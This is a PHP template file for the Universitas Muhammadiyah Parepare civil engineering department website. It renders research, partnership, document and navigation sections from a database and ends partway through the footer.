//                     </ol>
//                 </nav>
//             </div>
//             <div class="text-center">
//                 <p class="mb-5 judulred">Komunitas</p>
//             </div>
//             <div class="row">';
//             foreach ($datakomunitasmhs1 as $row1):
//                 $komunitas1 = htmlspecialchars($row1["Komunitas"]);
//                 switch ($komunitas1) {
//                     case 'Robotik-180':
//                         $nmpnjg = 'Komunitas Robotika';
//                         $logohimp = '<img src="' . BASE_URL . '/img/himpunan/robotik-180.jpg" class="img-fluid w-50 logo-clickable" alt="" loading="lazy" data-target="#robotik-tab" style="cursor: pointer;">';
//                         break;
//                     case 'KP2I':
//                         $nmpnjg = 'Komunitas Penalaran dan Penulisan Ilmiah';
//                         $logohimp = '<img src="' . BASE_URL . '/img/himpunan/kp2i.jpg" class="img-fluid w-50 logo-clickable" alt="" loading="lazy" data-target="#kp2i-tab" style="cursor: pointer;">';
//                         break;
//                     case 'Vision-180':
//                         $nmpnjg = 'Komunitas Multimedia';
//                         $logohimp = '<img src="' . BASE_URL . '/img/himpunan/vision-180.jpg" class="img-fluid w-50 logo-clickable" alt="" loading="lazy" data-target="#vision-tab" style="cursor: pointer;">';
//                         break;
//                 }
//                 echo'
//                 <div class="col-md-4 text-center">
//                     '.$logohimp.'
//                     <p class="mt-3 h6">'.$nmpnjg.'<br><span class="font-weight-bold">('.$komunitas1.')</span></p>
//                 </div>';         
//             endforeach;
//             echo'
//             </div>';
//         echo'
//             <ul class="nav nav-tabs mt-2" id="myTabs" hidden="hidden">';
//             $hideactive = ' active';
//             foreach ($datakomunitasmhs1 as $row2):
//                 $komunitas2 = htmlspecialchars($row2["Komunitas"]);
//                 switch ($komunitas2) {
//                     case 'Robotik-180':
//                         $idlink = 'robotik';
//                         $nmpnjg = 'Komunitas Robotika';
//                         break;
//                     case 'KP2I':
//                         $idlink = 'kp2i';
//                         $nmpnjg = 'Komunitas Penalaran dan Penulisan Ilmiah';
//                         break;
//                     case 'Vision-180':
//                         $idlink = 'vision';
//                         $nmpnjg = 'Komunitas Multimedia';
//                         break;
//                 }
//                 echo'
//                 <li class="nav-item'.$hideactive.'">
//                     <a class="nav-link" id="'.$idlink.'-tab" data-toggle="tab" href="#'.$idlink.'">'.$komunitas2.'</a>
//                 </li>';
//                 $hideactive = '';
//             endforeach;
//             echo'
//             </ul>';
//         echo'
//         </div>
//     </section>
    
//     <section class="headnav-2">
//         <div class="container-fluid py-4">
//             <div class="tab-content mt-2">';
//             $showactive = ' show active';
//             foreach ($datakomunitasmhs1 as $row3):
//                 $komunitas3 = htmlspecialchars($row3["Komunitas"]);
//                 switch ($komunitas3) {
//                     case 'Robotik-180':
//                         $idlink = 'robotik';
//                         $nmpnjg = 'Komunitas Robotika';
//                         break;
//                     case 'KP2I':
//                         $idlink = 'kp2i';
//                         $nmpnjg = 'Komunitas Penalaran dan Penulisan Ilmiah';
//                         break;
//                     case 'Vision-180':
//                         $idlink = 'vision';
//                         $nmpnjg = 'Komunitas Multimedia';
//                         break;
//                 }
//                 $fieldsisikegkom = ['Komunitas', 'NamaKegiatan', 'Keterangan', 'FileKegiatan'];
//                 $limitisikegkom = 10;
//                 $orderbyisikegkom = 'IdKegiatanKomunitas DESC';
//                 $kondisiisikegkom = ["Komunitas = '$komunitas3'", "Kode = '19'"];
//                 $dataisikegkom = $data->getDataFromTable($tbkomunitasmhs, $fieldsisikegkom, $orderbyisikegkom, $limitisikegkom, $kondisiisikegkom);
//                 echo'
//                 <div class="tab-pane fade'.$showactive.'" id="'.$idlink.'">
//                     <div class="row">
//                         <div class="col-md-5 mb-3">
//                             <div class="responsive1 slider">';
//                         foreach ($dataisikegkom as $isifoto):
//                             $nmkeg = $isifoto["NamaKegiatan"];
//                             $filekeg = $isifoto["FileKegiatan"];
//                             echo'
//                                 <div class="items">
//                                     <img src="'.BASE_URL.'img/himpunan/'.$filekeg.'" class="img-fluid img-thumbnail" alt="" loading="lazy">
//                                     <p class="text-center text-white mt-1">'.$nmkeg.'</p>
//                                 </div>';
//                         endforeach;
//                         echo'
//                             </div>
//                         </div>
//                         <div class="col-md-7">
//                             <p class="judulred">'.$nmpnjg.'</p>
//                                 <ul class="text-white pl-3">';
//                             foreach ($dataisikegkom as $isiket):
//                                 $nmkeg = $isiket["NamaKegiatan"];
//                                 $ketkeg = $isiket["Keterangan"];
//                                 echo'
//                                     <li class="text-warning"><span class="font-weight-bold">'.$nmkeg.' :</span><span class="text-white">'.$ketkeg.'</span></li>
//                                     ';
//                             endforeach;
//                             echo'
//                             </ul>
//                         </div>
//                     </div>
//                 </div>';
//                 $showactive = '';
//             endforeach;
//             echo'
//             </div>
//         </div>
//     </section>';
// }

function riset_pengabdian(){

    $data = new Data();

    $tbrispeng = 'tb_riset_pengabdian';
    $fieldsrispeng1 = null;
    $orderbyrispeng = 'KategoriPenelitiPengabdi ASC, IdPenelitiPengabdi ASC';
    $distinctrispeng1 = "KategoriPenelitiPengabdi";
    $limitrispeng = null;
    $kondisirispeng1 = ["Kode = '19'"];
    $datarispeng1 = $data->getDataFromTable($tbrispeng, $fieldsrispeng1, $orderbyrispeng, $limitrispeng, $kondisirispeng1, $distinctrispeng1);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <h2 class="card-title py-1 text-center text-uppercase">Riset & Pengabdian</h2>
            <div class="row justify-content-center">
                <div class="col-md-12">
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($datarispeng1 as $row1):
                        $kateg = htmlspecialchars($row1["KategoriPenelitiPengabdi"]);
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase">
                                        '.strtoupper($kateg).' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <div class="card-body table-responsive">
                                        <table class="table table-bordered table-hover text-nowrap" cellspacing="0" width="100%">
                                            <thead class="headnav-2 white-text text-center">
                                                <tr>
                                                    <th>No.</th>
                                                    <th>Peneliti</th>
                                                    <th>Judul Penelitian</th>
                                                    <th>Tahun</th>
                                                    <th>SKIM</th>
                                                    <th>Sumber Dana</th>
                                                </tr>
                                            </thead>
                                            <tbody>';
                                            $fieldsrispeng2 = ['KategoriPenelitiPengabdi', 'NamaPenelitiPengabdi', 'JudulPenelitiPengabdi', 'Tahun', 'SKIM', 'SumberDana'];
                                            $distinctrispeng2 = null;
                                            $kondisirispeng2 = ["KategoriPenelitiPengabdi = '$kateg'", "Kode = '19'"];
                                            $datarispeng2 = $data->getDataFromTable($tbrispeng, $fieldsrispeng2, $orderbyrispeng, $limitrispeng, $kondisirispeng2, $distinctrispeng2);
                                            $no=1;
                                            foreach ($datarispeng2 as $row2):
                                                $nmrispeng = htmlspecialchars($row2["NamaPenelitiPengabdi"]);
                                                $jdlrispeng = htmlspecialchars($row2["JudulPenelitiPengabdi"]);
                                                $thnrispeng = htmlspecialchars($row2["Tahun"]);
                                                $skimrispeng = htmlspecialchars($row2["SKIM"]);
                                                $sumberdanarispeng = htmlspecialchars($row2["SumberDana"]);
                                            echo'
                                                <tr>
                                                    <td class="py-1">'.$no.'.</td>
                                                    <td class="py-1">'.$nmrispeng.'</td>
                                                    <td class="py-1">'.$jdlrispeng.'</td>
                                                    <td class="py-1">'.$thnrispeng.'</td>
                                                    <td class="py-1">'.$skimrispeng.'</td>
                                                    <td class="py-1">'.$sumberdanarispeng.'</td>
                                                </tr>';
                                                $no++;
                                            endforeach;
                                            echo'
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                    </div>
                </div>
            </div>
        </div>
    </section>';
}

function kerjasama(){

    $data = new Data();

    $tbkerjasama = 'tb_kerjasama';
    $fieldskerjasama1 = null;
    $orderbykerjasama1 = 'KategoriKerjasama ASC, IdKerjasama ASC';
    $distinctkerjasama1 = "KategoriKerjasama";
    $limitkerjasama = null;
    $kondisikerjasama1 = ["Kode = '19'"];
    $datakerjasama1 = $data->getDataFromTable($tbkerjasama, $fieldskerjasama1, $orderbykerjasama1, $limitkerjasama, $kondisikerjasama1, $distinctkerjasama1);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <h2 class="card-title py-1 text-center text-uppercase">Kerjasama</h2>
            <div class="row justify-content-center">
                <div class="col-md-12">
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($datakerjasama1 as $row1):
                        $kateg = htmlspecialchars($row1["KategoriKerjasama"]);
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase">
                                        '.strtoupper($kateg).' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <div class="card-body table-responsive">
                                        <table class="table table-bordered table-hover text-nowrap" cellspacing="0" width="100%">
                                            <thead class="headnav-2 white-text text-center">
                                                <tr>
                                                    <th>No.</th>
                                                    <th>Mitra</th>
                                                    <th>Jenis Kegiatan</th>
                                                    <th>Tahun Mulai</th>
                                                    <th>Tahun Selesai</th>
                                                    <th>Manfaat</th>
                                                    <th>Logo Mitra</th>
                                                </tr>
                                            </thead>
                                            <tbody class="text-center">';
                                            $fieldskerjasama2 = ['KategoriKerjasama', 'Mitra', 'JenisKegiatan', 'TahunMulai', 'TahunSelesai', 'Manfaat', 'FileMitra'];
                                            $distinctkerjasama2 = null;
                                            $kondisikerjasama2 = ["KategoriKerjasama = '$kateg'", "Kode = '19'"];
                                            $orderbykerjasama2 = 'IdKerjasama ASC';
                                            $datakerjasama2 = $data->getDataFromTable($tbkerjasama, $fieldskerjasama2, $orderbykerjasama2, $limitkerjasama, $kondisikerjasama2, $distinctkerjasama2);
                                            $no=1;
                                            foreach ($datakerjasama2 as $row2):
                                                $mitra = htmlspecialchars($row2["Mitra"]);
                                                $jnskeg = htmlspecialchars($row2["JenisKegiatan"]);
                                                $thnmul = htmlspecialchars($row2["TahunMulai"]);
                                                $thnsel = htmlspecialchars($row2["TahunSelesai"]);
                                                $manfaat = htmlspecialchars($row2["Manfaat"]);
                                                $file = htmlspecialchars($row2["FileMitra"]);
                                            echo'
                                                <tr>
                                                    <td class="align-middle py-1">'.$no.'.</td>
                                                    <td class="align-middle py-1">'.$mitra.'</td>
                                                    <td class="align-middle py-1">'.$jnskeg.'</td>
                                                    <td class="align-middle py-1">'.$thnmul.'</td>
                                                    <td class="align-middle py-1">'.$thnsel.'</td>
                                                    <td class="align-middle py-1">'.$manfaat.'</td>
                                                    <td class="py-1"><img src="'.BASE_URL.'img/kerjasama/'.$file.'" class="img-fluid img-tdumbnail" width="80"></td>
                                                </tr>';
                                                $no++;
                                            endforeach;
                                            echo'
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                    </div>
                </div>
            </div>
        </div>
    </section>';
}

function dokumen(){
    
    $data = new Data();

    $tbdokumen = 'tb_dokumen';
    $fieldsdokumen = ['NamaDokumen', 'FileDokumen'];
    $orderbydokumen = 'IdDokumen ASC';
    $limitdokumen = null;
    $kondisidokumen = ["Kode = '19'"];
    $datadokumen = $data->getDataFromTable($tbdokumen, $fieldsdokumen, $orderbydokumen, $limitdokumen, $kondisidokumen);

    $file_ext = array('rar', 'zip', 'pdf', 'docx', 'doc');
    $file_img = array(
        '<i class="fa fa-file-archive-o text-secondary"></i> ',
        '<i class="fa fa-file-archive-o text-warning"></i> ',
        '<i class="fa fa-file-pdf-o text-danger"></i> ',
        '<i class="fa fa-file-word-o text-primary"></i> ',
        '<i class="fa fa-file-word-o text-primary"></i> '
    );

    echo '
    <section class="bg-batik">
        <div class="container py-4">
            <h2 class="card-title py-1 text-center text-uppercase">Dokumen</h2>
            <div class="row">
                <div class="col-md-12">
                    <ol class="text-justify">';
                    foreach ($datadokumen as $row):
                        $nmdok = htmlspecialchars($row["NamaDokumen"]);
                        $filedok = htmlspecialchars($row["FileDokumen"]);

                        $file_info = pathinfo($filedok);
                        $extension = strtolower($file_info['extension']);
                        $index = array_search($extension, $file_ext);
                        if ($index !== false && isset($file_img[$index])) {
                            $file_icon = $file_img[$index];
                        } else {
                            $file_icon = '<i class="fa fa-file"></i> ';
                        }
                        echo '
                            <li>' . $file_icon . $nmdok . ' <a href="' . BASE_URL . 'img/dokumen/' . $filedok . '" target="_blank" download="' . $nmdok . '"><i class="fa fa-download" aria-hidden="true"></i> Download</a></li>';
                    endforeach;
                    echo '
                    </ol>
                </div>
            </div>
        </div>
    </section>';
}

function laboratorium(){

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <h2 class="card-title py-1 text-center text-uppercase">Laboratorium</h2>
            <div class="row">

            </div>
        </div>
    </section>';
}

require_once 'data.php';

date_default_timezone_set("Asia/Makassar");

?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="keywords" content="Prodi Teknik Sipil - UMPAR" />
    <meta name="description" content="Prodi Teknik Sipil - UMPAR">
    <meta name="author" content="pustikom.umpar.ac.id">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="copyright" content="Copyright 2023. Prodi Teknik Sipil - Universitas Muhammadiyah Parepare. All Rights Reserved." />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="psts.umpar.ac.id" />
    <meta property="og:title" content="Prodi Teknik Sipil - UMPAR" />
    <meta property="og:url" content="<?= BASE_URL; ?>" />
    <meta property="og:description" content="Prodi Teknik Sipil - Universitas Muhammadiyah Parepare" />
    <meta property="og:locale" content="id_ID" />
    <meta property="og:image" content="<?= BASE_URL; ?>img/umpar.png" />
    <meta property="og:image:secure_url" content="<?= BASE_URL; ?>img/umpar.png" />
    <meta property="og:image:type" content="image/png" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:creator" content="@tekniksipilumpar" />
    <meta name="twitter:site" content="@tekniksipilumpar" />
    <meta name="twitter:title" content="Prodi Teknik Sipil - UMPAR" />
    <meta name="twitter:description" content="Prodi Teknik Sipil - Universitas Muhammadiyah Parepare" />
    <noscript>
        <meta http-equiv="refresh" content="0;URL=nojs" /></noscript>
    <link rel="shortcut icon" href="<?= BASE_URL ?>img/umpar.ico" type="image/x-icon">

    <link rel="stylesheet" href="<?= BASE_URL ?>css/bootstrap.min.css">
    <link rel="stylesheet" href="<?= BASE_URL ?>css/mdb.min.css">
	<link rel="stylesheet" href="<?= BASE_URL; ?>css/font-awesome.css">
    <link rel="stylesheet" href="<?= BASE_URL ?>css/slick.css">
    <link rel="stylesheet" href="<?= BASE_URL ?>css/slick-theme.css">
    <link rel="stylesheet" href="<?= BASE_URL ?>css/cssku.css">
    <title>Prodi Teknik Sipil - Universitas Muhammadiyah Parepare</title>
</head>

<body id="google_translate_element2">
    <header>
        <div class="header-top headnav-1">
            <div class="container">
                <ul class="nav social-icons list-unstyled list-inline mt-3 small">
                    <li class="list-inline-item" style="margin-top: -5px;">
                        <a class="mx-1" href="https://ft.umpar.ac.id" target="_blank" title="INFO-FT">
                            INFO-FT
                        </a>
                    </li>
                    <li class="list-inline-item" style="margin-top: -5px;">
                        <a class="mx-1" href="https://umpar.ac.id" target="_blank" title="INFO-UMPAR">
                            INFO-UMPAR
                        </a>
                    </li>
                    <li class="list-inline-item" style="margin-top: -5px;">
                        <a class="mx-1" href="https://sbmptmsulawesi.id/" target="_blank" title="PMB-UMPAR">
                            PMB-UMPAR
                        </a>
                    </li>
                    <li class="list-inline-item" style="margin-top: -5px;">
                        <a class="mx-1" href="https://jurnal.umpar.ac.id/index.php/karajata" target="_blank" title="Jurnal">
                            Jurnal Karajata
                        </a>
                    </li>
                    <li class="list-inline-item" style="margin-top: -5px;">
                        <a class="mx-1" href="<?= BASE_URL ?>laboratorium" title="Jurnal">
                            Laboratorium
                        </a>
                    </li>
                    <li class="list-inline-item dropdown" style="margin-top: -5px;">
                        <a class="dropdown-toggle mr-3" data-toggle="dropdown" href="#" role="button"
                            aria-haspopup="true" aria-expanded="false">E-Layanan</a>
                        <div class="dropdown-menu">
                            <a class="dropdown-item" style="font-size: 11px;" href="http://e-cash.umpar.ac.id/"
                                target="_blank">E-Cash UMPAR</a>
                            <a class="dropdown-item" style="font-size: 11px;" href="http://logbook.umpar.ac.id/"
                                target="_blank">Logbook UMPAR</a>
                            <a class="dropdown-item" style="font-size: 11px;" href="http://wehousebelda.umpar.ac.id/"
                                target="_blank">LMS UMPAR</a>
                            <a class="dropdown-item" style="font-size: 11px;" href="http://v-kkn.umpar.ac.id/"
                                target="_blank">V-KKN UMPAR</a>
                            <a class="dropdown-item" style="font-size: 11px;" href="http://digilib.umpar.ac.id/"
                                target="_blank">DIGILIB UMPAR</a>
                        </div>
                    </li>
                    <li class="list-inline-item region">
                        <a onclick="doGTranslate('id|id');return false;" title="Indonesian">
                            <img src="<?= BASE_URL; ?>img/indonesia.png" class="img-fluid">
                        </a>
                    </li>
                    <li class="list-inline-item region">
                        <a onclick="doGTranslate('id|ar');return false;" title="Arabic">
                            <img src="<?= BASE_URL; ?>img/saudi-arabia.png" class="img-fluid">
                        </a>
                    </li>
                    <li class="list-inline-item region">
                        <a onclick="doGTranslate('id|en');return false;" title="English">
                            <img src="<?= BASE_URL; ?>img/united-kingdom.png" class="img-fluid">
                        </a>
                    </li>
                    <li class="list-inline-item region">
                        <a onclick="doGTranslate('id|zh-CN');return false;" title="Chinese">
                            <img src="<?= BASE_URL; ?>img/china.png" class="img-fluid">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <nav class="navbar navbar-expand-lg navbar-dark headnav-2" id="navbar_top">
            <div class="container">
                <a class="navbar-brand" href="<?= BASE_URL ?>">
                    <img src="<?= BASE_URL ?>img/headftsi.png" height="50" alt="Logo UMPAR FT Sipil">
                </a>
                <button class="navbar-toggler second-button" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <div class="animated-icon2"><span></span><span></span><span></span><span></span></div>
                </button>
                <?php
                    $navberan="";

                    $navprofil="";
                    $subvisimisitujuan="";
                    $substruktur="";
                    $subdosente="";
                    $subfasilitas="";

                    $navakademik="";
                    $subkalender="";
                    $subpanduan="";
                    $substrukkuri="";
                    $subcapstone="";
                    $subcpl="";
                    $subdownload="";

                    $navmhsalumni="";                    
                    $subhimmhs="";
                    $subpresmhs="";
                    $subkommhs="";

                    $navrispeng="";

                    $navkerjasama="";

                    $navdokumen="";

                    $mod = isset($_GET['prodits']) ? $_GET['prodits'] : '';
					switch ($mod){
						case "": $navberan=' active'; break;

						case "visi_misi_tujuan": $navprofil=' active'; $subvisimisitujuan=' active'; break;
						case "struktur_organisasi": $navprofil=' active'; $substruktur=' active'; break;
						case "dosen_program_studi": $navprofil=' active'; $subdosente=' active'; break;
						case "fasilitas": $navprofil=' active'; $subfasilitas=' active'; break;
                        
						case "kalender_akademik": $navakademik=' active'; $subkalender=' active'; break;
						// case "panduan_akademik": $navakademik=' active'; $subpanduan=' active'; break;
						case "struktur_kurikulum": $navakademik=' active'; $substrukkuri=' active'; break;
						case "capstone_design": $navakademik=' active'; $subcapstone=' active'; break;
						// case "capaian_pembelajaran_lulusan": $navakademik=' active'; $subcpl=' active'; break;
						case "download": $navakademik=' active'; $subdownload=' active'; break;

						case "himpunan_mahasiswa": $navmhsalumni=' active'; $subhimmhs=' active'; break;
						case "prestasi_mahasiswa": $navmhsalumni=' active'; $subpresmhs=' active'; break;
						// case "komunitas_mahasiswa": $navmhsalumni=' active'; $subkommhs=' active'; break;

                        case "riset_pengabdian": $navrispeng=' active'; break;

						case "kerjasama": $navkerjasama=' active'; $subdlmneg=' active'; break;
                        
                        case "dokumen": $navdokumen=' active'; break;
					}
                    ?>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav ml-auto">
                        <li class="nav-item<?= $navberan ?>">
                            <a class="nav-link text-uppercase small" href="<?= BASE_URL ?>">Beranda</a>
                        </li>
                        <li class="nav-item dropdown<?= $navprofil ?>">
                            <a class="nav-link text-uppercase small dropdown-toggle"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Profil</a>
                            <div class="dropdown-menu">
                                <a class="dropdown-item<?= $subvisimisitujuan ?>"
                                    href="<?= BASE_URL ?>visi_misi_tujuan">Visi, Misi & Tujuan</a>
                                <a class="dropdown-item<?= $substruktur ?>"
                                    href="<?= BASE_URL ?>struktur_organisasi">Struktur Organisasi</a>
                                <a class="dropdown-item<?= $subdosente ?>"
                                    href="<?= BASE_URL ?>dosen_program_studi">Dosen</a>
                                <a class="dropdown-item<?= $subfasilitas ?>"
                                    href="<?= BASE_URL ?>fasilitas">Fasilitas</a>
                            </div>
                        </li>
                        <li class="nav-item dropdown<?= $navakademik ?>">
                            <a class="nav-link text-uppercase small dropdown-toggle"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Akademik</a>
                            <div class="dropdown-menu">
                                <a class="dropdown-item<?= $subkalender ?>"
                                    href="<?= BASE_URL ?>kalender_akademik">Kalender Akademik</a>
                                <!-- <a class="dropdown-item<?= $subpanduan ?>"
                                    href="<?= BASE_URL ?>panduan_akademik">Panduan Akademik</a> -->
                                <a class="dropdown-item<?= $substrukkuri ?>"
                                    href="<?= BASE_URL ?>struktur_kurikulum">Struktur Kurikulum</a>
                                <a class="dropdown-item<?= $subcapstone ?>"
                                    href="<?= BASE_URL ?>capstone_design">Capstone Design</a>
                                <!-- <a class="dropdown-item<?= $subcpl ?>"
                                    href="<?= BASE_URL ?>capaian_pembelajaran_lulusan">Capaian Pembelajaran Lulusan</a> -->
                                <a class="dropdown-item<?= $subdownload ?>"
                                    href="<?= BASE_URL ?>download">Download</a>
                            </div>
                        </li>
                        <li class="nav-item dropdown<?= $navmhsalumni ?>">
                            <a class="nav-link text-uppercase small dropdown-toggle"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Mahasiswa & Alumni</a>
                            <div class="dropdown-menu">
                                <a class="dropdown-item<?= $subpresmhs ?>"
                                    href="<?= BASE_URL ?>prestasi_mahasiswa">Prestasi Mahasiswa</a>
                                <a class="dropdown-item<?= $subhimmhs ?>"
                                    href="<?= BASE_URL ?>himpunan_mahasiswa">Himpunan Mahasiswa</a>
                                <!-- <a class="dropdown-item<?= $subkommhs ?>"
                                    href="<?= BASE_URL ?>komunitas_mahasiswa">Komunitas Mahasiswa</a> -->
                            </div>
                        </li>
                        <li class="nav-item<?= $navrispeng ?>">
                            <a class="nav-link text-uppercase small" href="<?= BASE_URL ?>riset_pengabdian">Riset &
                                Pengabdian</a>
                        </li>
                        <li class="nav-item<?= $navkerjasama ?>">
                            <a class="nav-link text-uppercase small" href="<?= BASE_URL ?>kerjasama">Kerjasama</a>
                        </li>
                        <li class="nav-item<?= $navdokumen ?>">
                            <a class="nav-link text-uppercase small" href="<?= BASE_URL ?>dokumen">Dokumen</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>
    <?php
    $page = isset($_GET['prodits']) ? $_GET['prodits'] : '';
    switch($page){
        case "berita_program_studi":
            berita_program_studi();
            break;
        case "visi_misi_tujuan":
            visi_misi_tujuan();
            break;
        case "struktur_organisasi":
            struktur_organisasi();
            break;
        case "agenda":
            agenda();
            break;
        case "pengumuman":
            pengumuman();
            break;
        case "lowongan":
            lowongan();
            break;
        case "beasiswa":
            beasiswa();
            break;
        case "dosen_program_studi":
            dosen_program_studi();
            break;
        case "fasilitas":
            fasilitas();
            break;
        case "kalender_akademik":
            kalender_akademik();
            break;
        // case "panduan_akademik":
        //     panduan_akademik();
        //     break;
        case "struktur_kurikulum":
            struktur_kurikulum();
            break;
        case "capstone_design":
            capstone_design();
            break;
        // case "capaian_pembelajaran_lulusan":
        //     capaian_pembelajaran_lulusan();
        //     break;
        case "download":
            download();
            break;
        case "himpunan_mahasiswa":
            himpunan_mahasiswa();
            break;
        case "prestasi_mahasiswa":
            prestasi_mahasiswa();
            break;
        // case "komunitas_mahasiswa":
        //     komunitas_mahasiswa();
        //     break;
        case "riset_pengabdian":
            riset_pengabdian();
            break;
        case "kerjasama":
            kerjasama();
            break;
        case "dokumen":
            dokumen();
            break;
        case "laboratorium":
            laboratorium();
            break;
        default:
            beranda();
    }
    ?>

    <footer class="page-footer small pt-4 bg-bayang overlay-red fix"
        style="background-image: url(<?= BASE_URL ?>img/bg1.jpg);">
        <div class="container text-center text-md-left">
            <div class="row text-center text-md-left mt-3 pb-3">
                <!-- <div class="col-md-4 col-lg-4 col-xl-4 mx-auto mt-3 mb-3">
                    <img src="<?= BASE_URL ?>img/putih-logo.png" class="img-fluid" width="250" alt="Logo UMPAR">
                </div> -->
                <div class="col-md-4 col-lg-4 col-xl-4 mt-3 pb-3">
                    <h6 class="text-uppercase pb-4 text-center font-weight-bold">Hubungi Kami : </h6>
                    <p class="h6 text-uppercase">Program Studi Teknik Sipil</p>
                    <ul class="list-unstyled h6">
                        <li><i class="fa fa-map-marker"></i> Jl. Jend. Ahmad Yani KM.
                            6<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kode Pos : 91131<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RT :
                            002 / RW :
                            008<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kelurahan Bukit
                            Harapan<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kecamatan
                            Soreang<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kota
                            Parepare<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Provinsi Sulawesi Selatan,
                            Indonesia.
                        </li>
                        <li><i class="fa fa-envelope"></i> <i>ftumpar.sipil190@gmail.com </i> </li>
                    </ul>
                </div>
                <div class="col-md-4 col-lg-4 col-xl-4 mt-3 pb-3">
                    <h6 class="text-uppercase pb-4 text-center font-weight-bold">Info Tentang : </h6>
                    <ul class="list-unstyled text-uppercase h6">
                        <li class="py-2">
                            <a href="#!"><i class="fa fa-angle-double-right"></i> INFO-UMPAR</a>
                        </li>
                        <li class="py-2">
                            <a href="#!"><i class="fa fa-angle-double-right"></i> INFO-UMPAR</a>
                        </li>
                        <li class="py-2">
                            <a href="#!"><i class="fa fa-angle-double-right"></i> PMB-UMPAR</a>
                        </li>
                        <li class="py-2">
                            <a href="#!"><i class="fa fa-angle-double-right"></i> Jurnal UMPAR</a>
                        </li>
                        <li class="py-2">
                            <a href="#!"><i class="fa fa-angle-double-right"></i> Digilib UMPAR</a>
                        </li>
                    </ul>
                </div>
                <div class="col-md-4 col-lg-4 col-xl-4 mx-auto">
                    <div class="card card-cascade narrower m-0">
                        <!-- <div class="view view-cascade gradient-card-header blue-gradient">
              <h6 class="mb-0">UMPAR Map</h6>
            </div> -->
                        <div class="card-body card-body-cascade text-center">
                            <div id="map-container-google-1" class="z-depth-1-half map-container" style="height: 250px">
                                <iframe
                                    src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3980.175339914163!2d119.64993451475975!3d-3.9843200971023487!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2d95ba603eaad389%3A0x9ad2cfcb103c5473!2sUniversitas%20Muhammadiyah%20Parepare!5e0!3m2!1sid!2sid!4v1636263611945!5m2!1sid!2sid"
                                    height="250" frameborder="0" style="border:0" allowfullscreen>
                                </iframe>
                            </div>
                        </div>
                    </div>
                    <div class="mt-3 d-flex justify-content-center">
                        <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
                        <!-- Histats.com  START  (aync)-->
                        <script type="text/javascript">var _Hasync= _Hasync|| [];
                        _Hasync.push(['Histats.start', '1,4836676,4,471,112,61,00011111']);
                        _Hasync.push(['Histats.fasi', '1']);
                        _Hasync.push(['Histats.track_hits', '']);
                        (function() {
                        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
                        hs.src = ('//s10.histats.com/js15_as.js');
                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
                        })();</script>
                        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4836676&101" alt="" border="0"></a></noscript>
                        <!-- Histats.com  END  -->
                    </div>
                </div>
            </div>
            <hr>
            <div class="row d-flex align-items-center">
                <div class="col-md-12">
                    <p class="text-center text-md-right">Copyright © 2023
                        <a href="https://mdbootstrap.com/">
